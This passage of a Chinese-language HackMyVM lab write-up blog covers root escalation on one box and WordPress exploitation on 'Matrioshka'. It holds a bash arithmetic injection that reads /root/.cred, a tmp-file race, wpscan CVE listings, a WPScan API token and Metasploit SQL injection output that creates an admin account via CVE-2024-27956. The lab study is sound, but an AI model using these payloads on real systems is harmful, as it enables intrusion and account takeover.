&gt; authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422173530968.png" alt="image-20250422173530968"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拿着私钥登陆即可</span><br><span class="line">ssh todd@192.168.56.104 -i todd</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422173637853.png" alt="image-20250422173637853"></p><p>好吧这个shell也是很快就会断应该是针对的用户</p><p>sudo -l</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422174350373.png" alt="image-20250422174350373"></p><table><thead><tr><th>可运行命令</th><th>权限提升潜力</th><th>说明</th></tr></thead><tbody><tr><td><code>/bin/bash /srv/guess_and_check.sh</code></td><td>✅ <strong>高风险</strong></td><td>可尝试修改该脚本或替换内容</td></tr><tr><td><code>/usr/bin/rm</code></td><td>⚠️ 中等</td><td>利用需搭配文件写权限或 LPE 技巧</td></tr><tr><td><code>/usr/sbin/reboot</code></td><td>❌ 无提权</td><td>重启系统，没有提权价值</td></tr></tbody></table><p>可以利用&#x2F;usr&#x2F;bin&#x2F;rm和前面发现的靶机自带的工具解决shell断开问题</p><p>利用Pspy监控没有Root权限的Linux进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /var/www/html/tools</span><br><span class="line">$ ls</span><br><span class="line">fscan  les.sh  linpeas.sh  pspy64</span><br><span class="line">$ ./pspy64</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422180124829.png" alt="image-20250422180124829"></p><p>这里很明显是&#x2F;opt&#x2F;kill_todd.sh结束我们的shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /opt/kill_todd.sh</span><br></pre></td></tr></table></figure><p>接下来看一下guess_and_check.sh的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># check this script used by human </span><br><span class="line">a=$((RANDOM%1000))</span><br><span class="line">echo &quot;Please Input [$a]&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[+] Check this script used by human.&quot;</span><br><span class="line">echo &quot;[+] Please Input Correct Number:&quot;</span><br><span class="line">read -p &quot;&gt;&gt;&gt;&quot; input_number</span><br><span class="line"></span><br><span class="line">[[ $input_number -ne &quot;$a&quot; ]] &amp;&amp; exit 1</span><br><span class="line"></span><br><span class="line">sleep 0.2</span><br><span class="line">true_file=&quot;/tmp/$((RANDOM%1000))&quot;</span><br><span class="line">sleep 1</span><br><span class="line">false_file=&quot;/tmp/$((RANDOM%1000))&quot;</span><br><span class="line"></span><br><span class="line">[[ -f &quot;$true_file&quot; ]] &amp;&amp; [[ ! -f &quot;$false_file&quot; ]] &amp;&amp; cat /root/.cred || exit 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本就是最后验证一下你的</p><p>&#x2F;tmp&#x2F;目录下有没有它随机产生的0-999名称的两个文件</p><p>$true_file有$false_file没有的话就cat &#x2F;root&#x2F;.cred</p><p>我们在&#x2F;tmp下生成大量文件即可有很大的概率满足其要求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /tmp</span><br><span class="line">$ touch $( seq 500)</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422181543741.png" alt="image-20250422181543741"></p><p>得到了root的密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422181656069.png" alt="image-20250422181656069"></p><p>还有另一种方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[ $input_number -ne &quot;$a&quot; ]] &amp;&amp; exit 1</span><br></pre></td></tr></table></figure><p><code>shell</code> 语言中，数组的下标是数字，那个数字是会运算的，例如你可以构造：<code>a[$(cat /root/.cred)]</code></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250422183431367.png"></p><p>当然也可以直接读flag</p><p>这一种方法理论:</p><p><a href="https://7r1umph.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html">https://7r1umph.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_Matrioshka</title>
      <link href="/2025/05/29/hackmyvm-Matrioshka/"/>
      <url>/2025/05/29/hackmyvm-Matrioshka/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250524182836996.png" alt="image-20250524182836996"></p><p>扫描</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524194212477.png" alt="image-20250524194212477"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525135142936.png" alt="image-20250525135142936"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524194601367.png" alt="image-20250524194601367"></p><p>先将域名添加进hosts文件</p><p>是个wordpress</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524194840129.png" alt="image-20250524194840129"></p><p>扫描网站</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/Matr]</span><br><span class="line">└─# wpscan --url http://mamushka.hmv -e u,ap --plugins-detection aggressive --api-token &quot;w37ueOSrhj3dG2sKNoaWQBgoq6tRjQ11as06z288k7U&quot;</span><br><span class="line"></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] It seems like you have not updated the database for some time.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[+] URL: http://mamushka.hmv/ [192.168.56.105]</span><br><span class="line">[+] Started: Sat May 24 09:29:05 2025</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Server: Apache/2.4.61 (Debian)</span><br><span class="line"> |  - X-Powered-By: PHP/8.2.22</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://mamushka.hmv/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://mamushka.hmv/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://mamushka.hmv/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">Fingerprinting the version - Time: 00:00:09 &lt;==================================================================================================================================&gt; (700 / 700) 100.00% Time: 00:00:09</span><br><span class="line">[i] The WordPress version could not be detected.</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwentyfour</span><br><span class="line"> | Location: http://mamushka.hmv/wp-content/themes/twentytwentyfour/</span><br><span class="line"> | Last Updated: 2024-11-13T00:00:00.000Z</span><br><span class="line"> | Readme: http://mamushka.hmv/wp-content/themes/twentytwentyfour/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.3</span><br><span class="line"> | Style URL: http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css</span><br><span class="line"> | Style Name: Twenty Twenty-Four</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentytwentyfour/</span><br><span class="line"> | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:06:10 &lt;===================================================================                                                            &gt; (55860 / 103783) 53.82%  ETA: 00:05:17</span><br><span class="line"> Checking Known Locations - Time: 00:08:19 &lt;=============================================================================================================================&gt; (103783 / 103783) 100.00% Time: 00:08:19</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: http://mamushka.hmv/wp-content/plugins/akismet/</span><br><span class="line"> | Latest Version: 5.4</span><br><span class="line"> | Last Updated: 2025-05-07T16:30:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/akismet/, status: 403</span><br><span class="line"> |</span><br><span class="line"> | [!] 1 vulnerability identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</span><br><span class="line"> |     Fixed in: 3.1.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357</span><br><span class="line"> |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/</span><br><span class="line"> |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] meta-generator-and-version-info-remover</span><br><span class="line"> | Location: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/</span><br><span class="line"> | Latest Version: 16.0 (up to date)</span><br><span class="line"> | Last Updated: 2024-11-20T05:03:00.000Z</span><br><span class="line"> | Readme: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/, status: 403</span><br><span class="line"> |</span><br><span class="line"> | Version: 16.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt</span><br><span class="line"></span><br><span class="line">[+] ultimate-member</span><br><span class="line"> | Location: http://mamushka.hmv/wp-content/plugins/ultimate-member/</span><br><span class="line"> | Last Updated: 2025-05-14T22:48:00.000Z</span><br><span class="line"> | Readme: http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.10.4</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/, status: 403</span><br><span class="line"> |</span><br><span class="line"> | [!] 8 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.8.7 - Cross-Site Request Forgery to Membership Status Change</span><br><span class="line"> |     Fixed in: 2.8.7</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/2b670a80-2682-4b7f-a549-64a35345e630</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8520</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ffddc03-d4ae-460e-972a-98804d947d09</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.8.7 - Authenticated (Contributor+) Stored Cross-Site Scripting</span><br><span class="line"> |     Fixed in: 2.8.7</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/7488f9f3-03ea-4f4e-b5fb-c0dd02c5bb59</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8519</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/9e394bb2-d505-4bf1-b672-fea3504bf936</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.9.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary User Profile Picture Update</span><br><span class="line"> |     Fixed in: 2.9.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/54a53b30-4249-4559-85f8-7aeac2dc0df2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10528</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a9793b6-2186-46ef-b204-d8f8f154ebf3</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction &amp; Membership Plugin &lt; 2.9.2 - Information Exposure</span><br><span class="line"> |     Fixed in: 2.9.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cb9c5ef8-51f8-4a46-ae56-23302c5980aa</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0318</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4ee149bf-ffa3-4906-8be2-9c3c40b28287</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.9.2 - Unauthenticated SQL Injection</span><br><span class="line"> |     Fixed in: 2.9.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/31ef60db-4847-4623-a194-8722e668e6ab</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0308</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e3e5bb98-2652-499a-b8cd-4ebfe1c1d890</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.10.0 - Authenticated SQL Injection</span><br><span class="line"> |     Fixed in: 2.10.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/90b5192a-ceee-4612-8e21-2341bae29cad</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12276</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/846f9828-2f1f-4d08-abfb-909b8d634d8a</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt; 2.10.1 - Unauthenticated SQLi</span><br><span class="line"> |     Fixed in: 2.10.1</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1d39ff72-1178-4812-be55-9bf4b58bbbb6</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1702</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/34adbae5-d615-4f8d-a845-6741d897f06c</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Ultimate Member &lt;= 2.10.3 - Admin+ Arbitrary Function Call</span><br><span class="line"> |     Fixed in: 2.10.4</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/abc6e35c-d971-4c8f-bcd0-70c7e16ec067</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47691</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/dc8b33c7-23ef-4b5c-bdb9-b4e548d18832</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.8.6 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt</span><br><span class="line"></span><br><span class="line">[+] wp-automatic</span><br><span class="line"> | Location: http://mamushka.hmv/wp-content/plugins/wp-automatic/</span><br><span class="line"> | Latest Version: 3.115.0</span><br><span class="line"> | Last Updated: 2025-05-20T04:08:41.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - http://mamushka.hmv/wp-content/plugins/wp-automatic/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | [!] 7 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Automatic 2.0.3 - csv.php q Parameter SQL Injection</span><br><span class="line"> |     Fixed in: 2.0.4</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/dadc99ca-54ee-42b4-b247-79a47b884f03</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/19187/</span><br><span class="line"> |      - https://packetstormsecurity.com/files/113763/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Automatic &lt; 3.53.3 - Unauthenticated Arbitrary Options Update</span><br><span class="line"> |     Fixed in: 3.53.3</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4374</span><br><span class="line"> |      - https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Automatic &lt; 3.92.1 - Cross-Site Request Forgery to Privilege Escalation</span><br><span class="line"> |     Fixed in: 3.92.1</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/fa2f3687-7a5f-4781-8284-6fbea7fafd0e</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27955</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/12adf619-4be8-4ecf-8f67-284fc44d87d0</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Automatic &lt; 3.92.1 - Unauthenticated Arbitrary File Download and Server-Side Request Forgery</span><br><span class="line"> |     Fixed in: 3.92.1</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/620e8931-64f0-4d9c-9a4c-1f5a703845ff</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: Automatic &lt; 3.92.1 - Unauthenticated SQL Injection</span><br><span class="line"> |     Fixed in: 3.92.1</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Automatic Plugin &lt; 3.93.0 Cross-Site Request Forgery</span><br><span class="line"> |     Fixed in: 3.93.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e5d0dcec-41a7-40ae-b9ce-f839de9c28b8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32693</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6231e47e-2120-4746-97c1-2aa80aa18f4e</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Automatic &lt; 3.95.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via autoplay Parameter</span><br><span class="line"> |     Fixed in: 3.95.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d0198310-b323-476a-adf8-10504383ce1c</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4849</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4be58bfa-d489-45f5-9169-db8bab718175</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] WPScan DB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 5</span><br><span class="line"> | Requests Remaining: 20</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat May 24 09:39:28 2025</span><br><span class="line">[+] Requests Done: 105129</span><br><span class="line">[+] Cached Requests: 19</span><br><span class="line">[+] Data Sent: 28.118 MB</span><br><span class="line">[+] Data Received: 43.189 MB</span><br><span class="line">[+] Memory used: 456.652 MB</span><br><span class="line">[+] Elapsed time: 00:10:22</span><br></pre></td></tr></table></figure><p>根据扫描信息得知我们可以利用</p><p>Automatic 插件</p><p>CVE-2024-27956未授权SQL注入漏洞</p><p>也可以利用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nuclei -target http://mamushka.hmv </span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524223944214.png" alt="image-20250524223944214"></p><p>这里直接用msf的payload即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525121502068.png" alt="image-20250525121502068"></p><p><strong><img src="/../imgs/$%7Bfiilename%7D/image-20250525121522204.png" alt="image-20250525121522204"></strong></p><p>注意因为这个漏洞并不能达到完整利用(因为新版的<code>wordpress</code>是不允许上传<code>php</code>文件)也就是不能得到shell所以模块的自动检测机制无法确定目标是否存在漏洞</p><p>我们关掉这个自动检查他就会一步一步的向下进行虽然无法得到shell但是可以成功得到管理员用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/http/wp_automatic_sqli_to_rce) &gt; set VERBOSE true</span><br><span class="line">VERBOSE =&gt; true</span><br><span class="line">msf6 exploit(multi/http/wp_automatic_sqli_to_rce) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:4444 </span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. &quot;set ForceExploit true&quot; to override check result.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/http/wp_automatic_sqli_to_rce) &gt; set ForceExploit true</span><br><span class="line">ForceExploit =&gt; true</span><br><span class="line">msf6 exploit(multi/http/wp_automatic_sqli_to_rce) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:4444 </span><br><span class="line">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span><br><span class="line">[*] Attempting SQLi test to verify vulnerability...</span><br><span class="line">[!] The target is not exploitable. Target is not vulnerable or the SQLi test failed. ForceExploit is enabled, proceeding with exploitation.</span><br><span class="line">[*] &#123;SQLi&#125; Executing (SELECT 17 FROM information_schema.tables WHERE table_name = &#x27;wp_users&#x27;)</span><br><span class="line">[*] &#123;SQLi&#125; Encoded to (SELECT 17 FROM information_schema.tables WHERE table_name = 0x77705f7573657273)</span><br><span class="line">[*] &#123;SQLi&#125; Time-based injection: expecting output of length 0</span><br><span class="line">[*] &#123;WPSQLi&#125; Default prefix not found, attempting to detect custom table prefix...</span><br><span class="line">[*] &#123;SQLi&#125; Executing (SELECT LEFT(table_name, LENGTH(table_name) - LENGTH(&#x27;users&#x27;)) FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE &#x27;%\_users&#x27; AND (SELECT COUNT(*) FROM information_schema.columns i WHERE i.table_schema = tables.table_schema AND i.table_name = tables.table_name AND i.column_name IN (&#x27;user_login&#x27;, &#x27;user_pass&#x27;) ) = 2 LIMIT 1)</span><br><span class="line">[*] &#123;SQLi&#125; Encoded to (SELECT LEFT(table_name, LENGTH(table_name) - LENGTH(0x7573657273)) FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE 0x255c5f7573657273 AND (SELECT COUNT(*) FROM information_schema.columns i WHERE i.table_schema = tables.table_schema AND i.table_name = tables.table_name AND i.column_name IN (0x757365725f6c6f67696e, 0x757365725f70617373) ) = 2 LIMIT 1)</span><br><span class="line">[*] &#123;SQLi&#125; Time-based injection: expecting output of length 2</span><br><span class="line">[*] &#123;WPSQLi&#125; Custom table prefix detected: &#x27;Ep&#x27;</span><br><span class="line">[*] &#123;SQLi&#125; Executing (INSERT INTO Epusers (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) SELECT &#x27;myift.123&#x27;, MD5(&#x27;myift.123&#x27;), &#x27;myift.123&#x27;, &#x27;krysten_schuster@pfannerstill.example&#x27;, user_registered, user_status, &#x27;myift.123&#x27; FROM Epusers WHERE NOT EXISTS ( SELECT 1 FROM Epusers WHERE user_login = &#x27;myift.123&#x27; ) LIMIT 1 ON DUPLICATE KEY UPDATE user_pass = MD5(&#x27;myift.123&#x27;), user_nicename = &#x27;myift.123&#x27;, user_email = &#x27;krysten_schuster@pfannerstill.example&#x27;, display_name = &#x27;myift.123&#x27;)</span><br><span class="line">[*] &#123;SQLi&#125; Encoded to (INSERT INTO Epusers (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) SELECT 0x6d796966742e313233, MD5(0x6d796966742e313233), 0x6d796966742e313233, 0x6b72797374656e5f7363687573746572407066616e6e65727374696c6c2e6578616d706c65, user_registered, user_status, 0x6d796966742e313233 FROM Epusers WHERE NOT EXISTS ( SELECT 1 FROM Epusers WHERE user_login = 0x6d796966742e313233 ) LIMIT 1 ON DUPLICATE KEY UPDATE user_pass = MD5(0x6d796966742e313233), user_nicename = 0x6d796966742e313233, user_email = 0x6b72797374656e5f7363687573746572407066616e6e65727374696c6c2e6578616d706c65, display_name = 0x6d796966742e313233)</span><br><span class="line">[*] &#123;WPSQLi&#125; User &#x27;myift.123&#x27; created or updated successfully.</span><br><span class="line">[*] &#123;SQLi&#125; Executing (INSERT INTO Epusermeta (user_id, meta_key, meta_value) SELECT ID, &#x27;Epcapabilities&#x27;, &#x27;a:1:&#123;s:13:&quot;administrator&quot;;s:1:&quot;1&quot;;&#125;&#x27; FROM Epusers WHERE user_login = &#x27;myift.123&#x27; ON DUPLICATE KEY UPDATE meta_value = &#x27;a:1:&#123;s:13:&quot;administrator&quot;;s:1:&quot;1&quot;;&#125;&#x27;)</span><br><span class="line">[*] &#123;SQLi&#125; Encoded to (INSERT INTO Epusermeta (user_id, meta_key, meta_value) SELECT ID, 0x45706361706162696c6974696573, 0x613a313a7b733a31333a2261646d696e6973747261746f72223b733a313a2231223b7d FROM Epusers WHERE user_login = 0x6d796966742e313233 ON DUPLICATE KEY UPDATE meta_value = 0x613a313a7b733a31333a2261646d696e6973747261746f72223b733a313a2231223b7d)</span><br><span class="line">[*] &#123;WPSQLi&#125; Admin privileges granted or updated for user &#x27;myift.123&#x27;.</span><br><span class="line">[-] Exploit aborted due to failure: unexpected-reply: Failed to log in to WordPress admin.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250525121726232.png" 